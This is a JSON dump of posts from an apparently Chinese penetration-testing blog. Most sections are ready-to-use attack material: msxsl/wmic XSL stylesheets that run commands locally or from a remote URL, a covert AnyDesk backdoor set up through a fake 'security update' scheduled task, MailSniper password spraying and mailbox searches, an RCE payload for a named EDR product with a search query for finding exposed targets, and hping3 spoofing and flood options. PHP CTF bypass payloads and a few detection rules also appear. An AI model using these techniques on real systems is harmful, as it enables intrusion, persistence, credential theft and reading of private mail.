Language)\n\n\n\n`msxsl.exe`是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=21714\n\n执行该工具需要用到2个文件，分别为`XML`及`XSL`文件，msxsl命令行接受参数形式如下：\n\n```bash\nmsxsl.exe {xmlfile} {xslfile}\n\n# 调用文件内的命令\nmsxsl.exe {xslfile} {xslfile}\n```\n\n\n\n### 命令执行\n\n#### 技术复现（MSXSL.EXE）\n\n##### 本地执行\n\ntest.xml\n\n```xml\n<?xml version=\"1.0\"?>\n\n<?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?>\n\n<customers>\n\n<customer>\n\n<name>Microsoft</name>\n\n</customer>\n\n</customers>\n```\n\nexec.xsl\n\n```xml\n<?xml version=\"1.0\"?>\n\n<xsl:stylesheet version=\"1.0\"\n\nxmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n\nxmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\n\nxmlns:user=\"http://mycompany.com/mynamespace\">\n\n \n\n<msxsl:script language=\"JScript\" implements-prefix=\"user\">\n\n   function xml(nodelist) {\n\nvar r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\");\n\n    //这里可以改造为执行你的木马文件如：\n\n\t// var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /k cd c:\\ & shell.exe\");\n\n   return nodelist.nextNode().xml;\n\n \n\n   }\n\n</msxsl:script>\n\n<xsl:template match=\"/\">\n\n   <xsl:value-of select=\"user:xml(.)\"/>\n\n</xsl:template>\n\n</xsl:stylesheet>\n```\n\n执行\n\n```bash\nmsxsl.exe test.xml exec.xsl\n```\n\n\n\n\n\n##### 远程执行\n\n```bash\nmsxsl.exe https://raw.githubusercontent.com/xx/master/test.xml  https://raw.githubusercontent.com/xx/master/exec.xsl\n\n\n```\n\n\n\n\n\n\n\n#### 技术复现（WMIC.EXE）\n\nwmic可通过如下方式执行xsl内的恶意代码\n\n```bash\nwmic.exe {wmic_cmd} /FORMAT:{xsl_file}\n```\n\n##### 本地执行\n\n```bash\nwmic.exe process get name /format:exec.xsl\n```\n\n\n\n##### 远程执行\n\n```bash\nwmic.exe process get name /format:http:/www.xxx.com/exec.xsl\n```\n\n\n\nhttps://www.cnblogs.com/backlion/p/10489916.html\n\n\n\n### 威胁检测\n\n**数据源：** 进程监视、进程命令行参数、网络的进程使用、DLL监视\n\n#### msxsl.exe\n\n进程特征：\n\n```bash\n# 当msxsl.exe作为父进程创建其他进程时视为可疑\nParentImage regex '^.*msxsl\\.exe$'\n```\n\n加载项特征：\n\n```bash\n#当msxsl.exe加载jscript.dll时视为可疑\nImage regex '^.*msxsl\\.exe$' AND ImageLoaded contains 'jscript.dll'\n```\n\n\n\n#### wmic.exe\n\n加载项特征\n\n```bash\n#当wmic.exe加载jscript.dll时视为可疑\nImage regex '^.*wmic\\.exe$' AND ImageLoaded contains 'jscript.dll'\n```\n\n\n\n### 通过MSXSL方式进行鱼叉式网络钓鱼\n\n有年头的参考文章：https://www.anquanke.com/post/id/159316\n\n\n\n\n\n","tags":["MSXSL.exe"],"categories":["渗透测试"]},{"title":"使用anydesk做远控","url":"%2Fposts%2F15621%2F","content":"\n> anydesk是类似teamviewer的远程管理软件，但是他不用安装且体积小\n\n\n\n### 场景举例\n\n- 有云锁，护卫神等禁止3389登录时\n- 类似阿里云这种，登录3389会报警\n- 连接内网中可以出网的windows机器\n\n\n\n### 注意事项\n\n- 启动anydesk的权限需要桌面用户权限，比如，IIS做中间件的环境中，拿到了webshell一般都\n  是没有桌面用户权限的，如果启动anydesk不会成功\n- 启动anydesk时桌面不能被注销\n- 有可能连接上去是黑屏，这个是因为该桌面用户退出远程桌面但没有注销，此时，除非能用\n  winlogon启动anydesk，否则没法使用屏幕\n\n\n\n\n\n### 使用方法\n\n1. 习惯性的使用https://www.virustotal.com/gui扫描一下\n\n2. 假设获取到了目标系统的一个msf的shell\n\n   ```bash\n   # 下载anydesk到一个公共目录下\n   (New-Object System.Net.WebClient).DownloadFile(\"https://download.anydesk.com/AnyDesk.exe?_ga=2.176752485.1141763109.1599703967-925913843.1599703967\",\"C:\\Users\\Public\\Desktop\\anydesk.exe\")\n   \n   # 确定有哪些用户正在使用桌面???\n   (((Get-WmiObject -Class Win32_Process -Filter 'Name=\"explorer.exe\"').GetOwner().))\n   \n   # 启动一个计划任务，启动的用户为上个步骤选中的用户???\n   schtasks /Create /TN Windwos_Security_Update /SC monthly /tr \"c:\\......\"\n   \n   # 先执行一次计划任务，生成配置文件\n   schtasks /run /tn Windwos_Security_Update\n   \n   # 等待几秒，等anydesk成功连接到网络，再把anydesk进程杀掉，dir看用户下面是否生成配置文件，然后再service.conf里面的添加密码(AnyDeskGetAccess)\n   \n   \n   # 查看anydeskID并启动anydesk\n   \n   \n   # 不需要到目标机器上点击接受，输入密码即可\n   \n   \n   # 分享一个高权限webshell下可以使用的powershell脚本\n   \n   ```\n\n   <img src=\"http://image.xpshuai.cn/image-20200910104429278.png\" ></img>\n\n   \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["anydesk"],"categories":["渗透测试"]},{"title":"mailsniper.ps1","url":"%2Fposts%2F27598%2F","content":"\n> 下载地址：https://github.com/dafthack/MailSniper.git\n\n\n\n## mailsniper.ps1获取outlook所有联系人\t\n\n> 收集邮箱，为后续爆破准备\n\n\n\n#### 前提\n\n掌握其中一个用户邮箱的账户密码，并可以登录outlook\n\n\n\n\n\n#### 利用\n\n命令格式\n\n```bash\n# 在域内机器上执行\npowershell -exec bypass\nImport-Module .\\MailSniper.ps1\nGet-GlobalAddressList -ExchHostname outlook地址 -UserName 域名\\域用户名 -Password 已知的邮箱密码 -OutFile 导出结果.txt\n```\n\n\n\n1.目标outlook搭建在自己的服务器上\n\n```bash\nExchHostname指向自己的邮箱服务器地址即可\n```\n\n\n\n2.目标outlook在office365中\n\n```bash\n一样的道理，只不过把ExchHostname指向outlook.office365.com即可，username使用完整的邮箱，而不仅仅是用户名。\n\n```\n\n\n\n\n\n\n\n#### 爆破exchange（指定密码爆破邮箱）\n\n```bash\npowershell -exec bypass\nImport-Module .\\MailSniper.ps1\nInvoke-PasswordSprayEWS -ExchHostname owa2013.rootkit.org -UserList .\\users.txt -Password Admin12345 -ExchangeVersion Exchange2013_SP1\n\n# -ExchHostname：ping -a exchange服务器ip -> 得到主机名 -> 主机名拼接域名（如：owa2013.rootkit.org）\n# -ExchangeVersion：若不知道可先不指定\n```\n\n\n\n\n\n\n\n#### MailSniper检索邮件内容\n\nMailsniper包含两个主要的cmdlet，分别是`Invoke-SelfSearch`和`Invoke-GlobalMailSearch`，用于检索邮件中的关键字。\n\n```bash\n## 查找当前用户的Exchange邮箱数据\nInvoke-SelfSearch -Mailbox zhangsan@fb.com -Terms *机密* -Folder 收件箱 -ExchangeVersion Exchange2013_SP1\n# 查找邮件内容中包含pwn字符串的邮件，-Folder参数可以指定要搜索的文件夹，默认是inbox，使用时最好指定要搜索的文件夹名称（或者指定all查找所有文件），因为该工具是外国人写的，Exchange英文版收件箱为Inbox，当Exchange使用中文版时收件箱不为英文名，默认查找inbox文件夹会因找不到该文件而出错\n\n## 查找所有用户的Exchange邮箱数据\nInvoke-GlobalMailSearch -ImpersonationAccount zhangsan -ExchHostname test2k12 -AdminUserName fb.com\\administrator -ExchangeVersion Exchange2013_SP1 -Term \"*内部邮件*\" -Folder 收件箱\n# 利用administrator管理员用户为普通用户zhangsan分配ApplicationImpersonation角色，检索所有邮箱用户的邮件中，包括“内部邮件”关键字的内容\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["mailsniper.ps1"],"categories":["渗透测试"]},{"title":"开源情报信息搜索(OSINT)","url":"%2Fposts%2F37%2F","content":"\n#### 搜索引擎语法\n\n- 百度\n\n- 谷歌\n\n- 必应\n\n  \n\n#### 在线接口\n\n- http://cebaidu.com/index/getRelatedSites?site_address=baidu.com\n- http://www.webscan.cc/\n- http://sbd.ximcx.cn/\n- https://censysio/certificates?q=example.com\n- https://crt.sh/?q=%25example.com\n- https://github.com/cOny1WorkScripts/tree/master/get-subdomain-from-baidu\n- https://dnsdumpster.com/\n- https://ww.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com\n- https://findsubdomains.com/\n- https://dnslytics.com/search?q=www.baidu.com\n- https://pentest-tools.com/information-gathering/find-subdomains-of-domain\n- https://viewdns.info/\n- https://www.ipneighbour.com#/lookup/114.114.114.114\n- https://securitytrails.com/list/apex_domain/baidu.com\n- https://url.fht.im/\n- http://api.hackertarget.com/hostsearch/?q=baidu.com\n- http://ww.yunseecn/finger.html\n\n\n\n\n\n#### 相关工具\n\n[https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md](https://github.com/rshipp/awesome-malware-analysis/blob/main/恶意软件分析大合集.md)\n\n\n\n\n\n\n\n\n\n\n\n#### DNS历史解析记录\n\n... ...\n\n\n\n\n\n#### Github Hacking\n\n可以搜索以下类型的信息：`Repositories`,`Topics`,`Issues and pull requests`,`Code`,`Commits`,`Users`,`Wikis`\n\n\n\n###### 搜索仓库\n\n```bash\n>\t\texp stars:>1000\t# 匹配关键字\"exp\"且star大于1000的仓库\n>=\t\texp topics:>=5\t# 匹配关键字\"exp\"且标签数量大于等于5的仓库\n<\t\texp size:>=1000\t# 匹配关键字\"exp\"且文件大于1KB的仓库\n<=\nn..*\texp stars:1000..*\t# 匹配关键字\"exp\"且star大于等于1000的仓库\n*..n\texp stars:*..1000\t# 匹配关键字\"exp\"且star小于等于1000的仓库\nn..n\texp stars:10..1000\t# 匹配关键字\"exp\"且star大于10并小于1000的仓库\n\n```\n\n其他语法类似... ...\n\n\n\n###### 搜索代码\n\n注意事项\n\n```bash\n- 只能搜索小于384 KB的文件。\n- 只能搜索少于500,000个文件的存储库。\n- 登录的用户可以搜索所有公共存储库。\n- 除filename 搜索外，搜索源代码时必须至少包含-一个搜索词。 例如，搜索language:javascript无效，而是这样: amazing language :javascript。\n- 搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。\n- 您不能将以下通配符用作搜索查询的一部分:， ，: ; /\\'\"=*!?#$&+^|~<>(){}[]。搜索将忽略这些符号。\n\n```\n\n日期条件\n\n```bash\nexp pushed:<2020-08-08\t# 搜索在2020年8月8日前push的代码,关键字是exp\nexp pushed:2020-05-05..2020-08-08\t# 日期区间\nexp created:>=2020-08-08\t# 创建时间\n```\n\n逻辑运算\n\n```bash\nAND\nOR\nNOT\n```\n\n排除运算\n\n```bash\nexp pushed:<2020-08-08 -language:java\t# 搜索在2020年8月8日前push的代码，关键字是exp，排除java语言的仓库\n```\n\n包含搜索\n\n```bash\nexp in:file    # 搜索文件中包含exp的代码\nexp in:path    # 搜索路径中包含exp的代码\nexp in:file,path    # 搜索文件、路径中包含exp的代码\nconsole path:app/public language:javascript\t\t# 搜索关键字console,语言为js，在app/public下的代码\n```\n\n主体搜索\n\n```bash\nuser:USERNAME\t# 用户名搜索\norg:ORGNAME\t\t# 组织搜索\nrepo:USERNAME/REPOSITORY\t# 指定仓库搜索\n```\n\n文件大小\n\n```bash\nsize:>1000\t# 搜索大于1KB的文件\n```\n\n文件名称\n\n```bash\nfilename :config.php language:php \t# 搜索文件名为config.php,且语言为php的代码\n\n# 例如搜索Java项目配置文件: \nmail filename:.properties\n\n```\n\n拓展名\n\n```bash\nextension:EXTENSION\t\t# 指定扩展名搜索\n\n# 例如:\nextension:properties jdbc\n\n```\n\n\n\n\n\n###### 自动化工具\n\nhttps://github.com/UnkL4b/GitMiner\n\n```bash\n# 简单用法\n# -r 正则， -q 查询关键字\npython3 gitminer-v2.0.py -C cookie.txt -q 'extension:properties jdbc' -r 'password(.*)' -m passwords\n\n```\n\n","tags":["Githun Hacking"],"categories":["渗透测试"]},{"title":"开放漏洞情报","url":"%2Fposts%2F28882%2F","content":"\n\n\n#### 常用网站\n\n- CVE\n- Exploit-DB\n- CX Security\n- CNVD\n- Security tracker\n\n\n\n\n\n#### Search Exploit-DB\n\nkali中自带\n\n```bash\nsearchsploit\n\n# 搜索Windows提权漏洞\nsearchsploit -t windows local\n\n# 搜索Apache漏洞\nsearchsploit -t apache\n\n```\n\n\n\n\n\n","tags":["开放漏洞情报"],"categories":["渗透测试"]},{"title":"字典生成-pydictor","url":"%2Fposts%2F31240%2F","content":"\n>  一个强大实用的黑客暴力破解字典建立工具\n\n\n\n地址：https://github.com/LandGrey/pydictor.git\n\n\n\n#### 简单示例\n\n生成字典\n\n```bash\npython pydictor.py --sedb\n```\n\n合并去重\n\n```bash\npython pydictor.py -tool uniqbiner /my/all/dict/\n```\n\n\n\n多字典文件组合工具\n\n```bash\npython pydictor.py -tool hybrider heads.txt some_others.txt tails.txt\n```\n\n\n\n>*使用pydictor有个窍门： 时刻清楚你想要什么样子的字典.*\n\n#### \n\n#### pydictor可以生成的所有字典的类型及其说明\n\n| 归属   | 类别         | 标识符 | 描述                      | 支持功能代号 |\n| ------ | ------------ | ------ | ------------------------- | ------------ |\n| core   | base         | C1     | 基础字典                  | F1 F2 F3 F4  |\n| core   | char         | C2     | 自定义字符集字典          | F1 F2 F3 F4  |\n| core   | chunk        | C3     | 排列组合字典              | ALL          |\n| core   | conf         | C4     | 配置语法生成字典          | ALL          |\n| core   | **extend**   | C5     | 规则扩展字典              | ALL          |\n| core   | sedb         | C6     | 社会工程学字典            | ALL          |\n| tool   | combiner     | T1     | 字典合并工具              |              |\n| tool   | comparer     | T2     | 字典比较相减工具          | ALL          |\n| tool   | **counter**  | T3     | 词频统计工具              | ALL          |\n| tool   | **handler**  | T4     | 筛选处理原有字典工具      | ALL          |\n| tool   | uniqbiner    | T5     | 先合并后去重工具          | ALL          |\n| tool   | **uniqifer** | T6     | 字典去重工具              | ALL          |\n| tool   | **hybrider** | T7     | 多字典文件组合工具        | F1 F2 F3 F4  |\n| plugin | birthday     | P1     | 生日日期字典插件          | ALL          |\n| plugin | ftp          | P2     | 关键词生成ftp密码字典插件 | ALL          |\n| plugin | pid4         | P3     | 身份证后四位字典插件      | ALL          |\n| plugin | pid6         | P4     | 身份证后六位字典插件      | ALL          |\n| plugin | pid8         | P5     | 身份证后八位字典插件      | ALL          |\n| plugin | scratch      | P6     | 网页原始关键词字典插件    | ALL          |\n\n\n\n#### 字典操作功能及说明对照表\n\n| 功能   | 功能代号 | 说明                                     |\n| ------ | -------- | ---------------------------------------- |\n| len    | F1       | 定义长度范围                             |\n| head   | F2       | 添加前缀                                 |\n| tail   | F3       | 添加后缀                                 |\n| encode | F4       | 编码或自定义加密方法                     |\n| occur  | F5       | 字母、数字、特殊字符出现次数范围筛选     |\n| types  | F6       | 字母、数字、特殊字符各种类数范围筛选     |\n| regex  | F7       | 正则筛选                                 |\n| level  | F8       | 字典级别筛选                             |\n| leet   | F9       | 1337 模式                                |\n| repeat | F10      | 字母、数字、特殊字符连续出现次数范围筛选 |\n\n\n\n#### 支持的编码或加密方式\n\n| 方式   | 描述                                       |\n| ------ | ------------------------------------------ |\n| none   | 默认方式, 不进行任何编码                   |\n| b16    | base16 编码                                |\n| b32    | base32 编码                                |\n| b64    | base64 编码                                |\n| des    | des 算法, 需要根据情况修改代码             |\n| execjs | 执行本地或远程js函数, 需要根据情况修改代码 |\n| hmac   | hmac 算法, 需要根据情况修改代码            |\n| md5    | md5 算法输出32位                           |\n| md516  | md5 算法输出16位                           |\n| rsa    | rsa 算法 需要根据情况修改代码              |\n| sha1   | sha-1 算法                                 |\n| sha256 | sha-256 算法                               |\n| sha512 | sha-512 算法                               |\n| url    | url 编码                                   |\n| test   | 一个自定义编码方法的示例                   |\n\n```bash\n --encode b64\n```\n\n\n\n#### occur 功能\n\n```\n用法 : --occur [字母出现次数的范围] [数字出现次数的范围] [特殊字符出现次数的范围]\n示例: --occur \">=4\" \"<6\" \"==0\"\n```\n\n#### types 功能\n\n```\n用法 : --types [字母种类的范围] [数字种类的范围] [特殊字符种类的范围]\n示例: --types \"<=8\" \"<=4\" \"=0\"\n```\n\n#### repeat 功能\n\n```\n用法 : --repeat [字母连续出现次数范围] [数字连续出现次数范围] [特殊字符连续出现次数范围]\n示例: --repeat \"<=3\" \">=3\" \"==0\"\n```\n\n#### regex 功能\n\n```\n用法 : --regex [正则表达式]\n示例: --regex \"^z.*?g$\"\n```\n\n#### level 功能\n\n```\n用法 : --level [level]\n示例: --level 4      /funcfg/extend.conf配置文件中level大于等于4的项目会被启用\n```\n\n#### leet功能\n\n#### 默认置换表\n\n```\nleet字符 = 替换字符，可以修改/funcfg/leet_mode.conf更改替换表\na = 4\nb = 6\ne = 3\nl = 1\ni = 1\no = 0\ns = 5\n```\n\n#### 模式代码\n\n```\n0               默认模式，全部替换\n1               从左至右, 将第一个遇到的leet字符全部替换\n2               从右至左, 将第一个遇到的leet字符全部替换\n11-19           从左至右, 将第一个遇到的leet字符最多替换 code-10 个\n21-29           从右至左, 将第一个遇到的leet字符最多替换 code-20 个\n```\n\n###### 代码作用表\n\n| 代码 | 原字符串        | 被替换后的新字符串 |\n| ---- | --------------- | ------------------ |\n| 0    | as a airs trees | 45 4 41r5 tr335    |\n| 1    | as a airs trees | 4s 4 4irs trees    |\n| 2    | as a airs trees | a5 a air5 tree5    |\n| 11   | as a airs trees | 4s a airs trees    |\n| 12   | as a airs trees | 4s 4 airs trees    |\n| 13   | as a airs trees | 4s 4 4irs trees    |\n| 14   | as a airs trees | 4s 4 4irs trees    |\n| ...  | as a airs trees | 4s 4 4irs trees    |\n| 21   | as a airs trees | as a airs tree5    |\n| 22   | as a airs trees | as a air5 tree5    |\n| 23   | as a airs trees | a5 a air5 tree5    |\n| 24   | as a airs trees | a5 a air5 tree5    |\n| ...  | as a airs trees | a5 a air5 tree5    |\n\n\n\n参考：https://cloud.tencent.com/developer/article/1180351\n\n","categories":["渗透测试"]},{"title":"php变量覆盖","url":"%2Fposts%2F50639%2F","content":"\n\n\n> 可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞\n\n\n\n## 场景\n\n- $$使用不当\n- extract()函数使用不当\n- parse_str()函数使用不当\n- import_request_variables()使用不当\n- 开启了全局变量注册\n- ... ... \n\n\n\n\n\n## 1. $$导致的变量覆盖\n\n> 经常在foreach中出现\n\n\n\n使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值\n\n```php\n<?php\n    \n//?name=test\n//output:string(4) “name” string(4) “test” string(4) “test” test\n\n$name='thinking';\n\nforeach ($_GET as $key => $value)\n    $$key = $value;\n    var_dump($key);\n    var_dump($value);\n    var_dump($$key);\n\necho $name;\n\n?>\n\n```\n\n例题：\n\n```php\n\n<?php\ninclude \"flag.php\";\n$_403 = \"Access Denied\";\n$_200 = \"Welcome Admin\";\n\nif ($_SERVER[\"REQUEST_METHOD\"] != \"POST\")\n\n    die(\"BugsBunnyCTF is here :p…\");\n\nif ( !isset($_POST[\"flag\"]) )\n    die($_403);\n\nforeach ($_GET as $key => $value)\n\tkey = value;\n\nforeach ($_POST as $key => $value)\n    $$key = $value;\n\n\tif ( $_POST[\"flag\"] !== $flag )\n\t\tdie($_403);\n\n\techo \"This is your flag : \". $flag . \"\\n\";\n\n\tdie($_200);\n\n?>\n```\n\n\n\n\n\n\n\n## 2. extract()函数导致的变量覆盖\n\n**extract()** 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 \n\n**语法：** `extract(array,extract_rules,prefix)`\n\n```bash\nextract 有三种形式可能导致变量覆盖:\n第一种是第二个参数为EXTR_OVERWRITE,他表示如果有冲突，覆盖原有的变量。\n第二种情况是只传入第一个参数，默认为EXTR_OVERWRITE模式。\n第三种是第二个参数为EXTR_IF_EXISTS，他表示在当前符号表中已有同名变量时，覆盖它们的值,其他的都不注册新变量.\n```\n\n\n\n例题1\n\n```php\n<?php\n$flag = 'xxx';\nextract($_GET);\n\nif (isset($gift)) {\n   $content = trim(file_get_contents($flag));\n   if ($gift == $content) {\n       echo 'hctf{…}';\n   } else {\n        echo 'Oh..';\n   }\n} \n?>\n\n    \n    \n//GET请求 ?flag=&gift=，extract()会将$flag和$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足$gift == $content。\n//payload:\n?flag=&gift=\n```\n\n\n\n例题2\n\n```php\n<?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { ?>\n      <?php\n        extract($_POST);\n        if ($pass == $thepassword_123) { ?>\n            <div class=”alert alert-success”>\n                <code><?php echo $theflag; ?></code>\n            </div>\n        <?php } ?>\n    <?php } ?>\n    \n    \n//extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖$pass和$thepassword_123变量的值，从而满足$pass == $thepassword_123这个条件。\n    \n// POST Payload:\n//pass=&thepassword_123=    \n```\n\n\n\n\n\n\n\n\n\n\n\n## 3. parse_str函数导致的变量覆盖\n\nparse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 \n\n语法：`parse_str(string,array)`\n\n\n\n例题1：\n\n```php\n<?php\nerror_reporting(0);\n\nif (empty($_GET['id'])) {\n    show_source(__FILE__);\n    die();\n\n} else {\n    include ('flag.php');\n    $a = \"www.OPENCTF.com\";\n    $id = $_GET['id'];\n    @parse_str($id);\n    if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) {\n        echo $flag;\n    } else {\n        exit('其实很简单其实并不难！');\n    }\n}\n?> \n    \n    \n//0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a  \n//利用php弱语言特性,\n    \n//使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到\n0e462097431906509019562988736854\n与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0\n所以相等，满足条件，得到flag。\n最终PAYLOAD： \nGET DATA: \n?id=a[0]=s878926199a \nor \n?id=a[0]=240610708\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["变量覆盖"],"categories":["渗透测试"]},{"title":"isset数组绕过","url":"%2Fposts%2F57106%2F","content":"\n\n\n\n\n#### 1.数组返回NULL绕过\n\n```php\n<?php \n\n$flag = \"flag\";\nif (isset ($_GET['password'])) {\n\tif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) \n\t\techo 'You password must be alphanumeric'; \n\telse if (strpos ($_GET['password'], '--') !== FALSE) \n\t\tdie('Flag: ' . $flag); \n\telse \n\t\techo 'Invalid password';\n}\n\n?>\n```\n\n\n\n**php不能处理数组**\n\n根据 `if (strpos ($_GET['password'], '--') !== FALSE)`\n\n知道password一定有`'--'`。开始构造` %2d `但是过不了，根据题目暗示和php特性可以传一个数组绕过判断\n\n```bash\nhttp://123.206.87.240:9009/19.php?password[]=sad%2d%2d\n```\n\n\n\n> strpos() 函数查找字符串在另一字符串中第一次出现的位置。\n>\n> **注释：**strpos() 函数对大小写敏感。\n\n\n\n> ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。\n\n\n\n#### 2.\n\n```php\n<?php\n$flag = \"flag\";\nif (isset ($_GET['ctf'])) {\nif (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE) //①\necho '必须输入数字才行';\nelse if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE) //②\ndie('Flag: '.$flag);\nelse\necho '骚年，继续努力吧啊~';\n}\n?>\n```\n\n\n\n**思路：**\n\n`ereg()`只能处理字符串的，遇到数组做参数返回NULL，判断用的是 === ，其要求值与类型都要相同，而NULL跟FALSE类型是不同的,所以①判断if不成立，继续执行②，这时strpos函数遇到数组，也返回NULL，与FALSE类型不同，if条件成立，输出flag。\n所以payload应该是`?ctf[]=任意字符`,甚至就是`?ctf[]=`\n\n\n\n\n\n\n\n\n\n","tags":["数组绕过"],"categories":["渗透测试"]},{"title":"深X服 EDR终端检测系统RCE漏洞复现","url":"%2Fposts%2F37031%2F","content":"\n\n\n#### 简介\n\n深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。\n\n\n\n#### EDR的界面\n\n<img src=\"http://image.xpshuai.cn/rce11.jpg\"></img>\n\n\n\n\n\n#### RCE Payload\n\n```bash\nhttps://xxx.com:xxx/tool/log/c.php?strip_slashes=system&host=id\n```\n\n<img src=\"http://image.xpshuai.cn/rce22.jpg\"></img>\n\n\n\n\n\n#### **Fofa关键字** \n\n```bash\ntitle=\"终端检测响应平台\"\n```\n\n","tags":["深信服"],"categories":["渗透测试"]},{"title":"hping3","url":"%2Fposts%2F18271%2F","content":"\n> hping3主要是测试防火墙的拦截规则，对网络设备进行测试\n\n#### 主要功能\n\n- 防火墙测试（参考：http://0daysecurity.com/articles/hping3_examples.html）\n- 端口扫描\n- Idle扫描\n- 拒绝服务攻击\n- 文件传输\n- 木马功能\n- ......\n\n\n\n#### **主要参数**\n\n```bash\n  -h  --help      显示帮助\n  -v  --version   显示版本\n  -c  --count     发送数据包的数目\n  -i  --interval  发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000)\n      --fast      等同 -i u10000 (每秒10个包)\n      --faster    等同 -i u1000 (每秒100个包)\n      --flood      尽最快发送数据包，不显示回复。\n  -n  --numeric   数字化输出，象征性输出主机地址。\n  -q  --quiet     安静模式\n  -I  --interface 网卡接口 (默认路由接口)\n  -V  --verbose   详细模式\n  -D  --debug     调试信息\n  -z  --bind      绑定ctrl+z到ttl(默认为目的端口)\n  -Z  --unbind    取消绑定ctrl+z键\n      --beep      对于接收到的每个匹配数据包蜂鸣声提示\n\n模式选择\n  default mode     TCP   // 默认模式是 TCP\n  -0  --rawip      RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。\n  -1  --icmp       ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。\n  -2  --udp        UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。\n  -8  --scan       SCAN mode. //扫描模式 指定扫描对应的端口。\n                   Example: hping --scan 1-30,70-90 -S www.target.host    // 扫描\n  -9  --listen     listen mode  // 监听模式\n  \nIP 模式\n  -a  --spoof      spoof source address  //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。\n  --rand-dest      random destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令\n  --rand-source    random source address mode. see the man.       // 随机源地址模式。详细使用 man 命令\n  -t  --ttl        ttl (默认 64)  //修改 ttl 值\n  -N  --id         id (默认 随机)  // hping 中的 ID 值，缺省为随机值\n  -W  --winid      使用win* id字节顺序  //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。\n  -r  --rel        相对id字段(估计主机流量)  //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。\n  -f  --frag       拆分数据包更多的frag.  (may pass weak acl)   //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。\n  -x  --morefrag   设置更多的分段标志    // 大量碎片，泪滴攻击。\n  -y  --dontfrag   设置不分段标志    // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。\n  -g  --fragoff    set the fragment offset    // 设置断偏移。\n  -m  --mtu        设置虚拟最大传输单元, implies --frag if packet size > mtu    // 设置虚拟MTU值，当大于mtu的时候分段。\n  -o  --tos        type of service (default 0x00), try --tos help          // tos字段，缺省0x00，尽力而为？\n  -G  --rroute     includes RECORD_ROUTE option and display the route buffer    // 记录IP路由，并显示路由缓冲。\n  --lsrr           松散源路由并记录路由        // 松散源路由\n  --ssrr           严格源路由并记录路由      // 严格源路由\n  -H  --ipproto    设置IP协议字段，仅在RAW IP模式下使用   //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。\n\nICMP 模式\n  -C  --icmptype   icmp类型(默认echo请求)    // ICMP类型，缺省回显请求。\n  -K  --icmpcode   icmp代号(默认0)     // ICMP代码。\n      --force-icmp 发送所有icmp类型(默认仅发送支持的类型)    // 强制ICMP类型。\n      --icmp-gw    设置ICMP重定向网关地址(默认0.0.0.0)    // ICMP重定向\n      --icmp-ts    等同 --icmp --icmptype 13 (ICMP 时间戳)            // icmp时间戳\n      --icmp-addr  等同 --icmp --icmptype 17 (ICMP 地址子网掩码)  // icmp子网地址\n      --icmp-help  显示其他icmp选项帮助      // ICMP帮助\n\nUDP/TCP 模式\n  -s  --baseport   base source port             (default random)              // 缺省随机源端口\n  -p  --destport   [+][+]<port> destination port(default 0) ctrl+z inc/dec 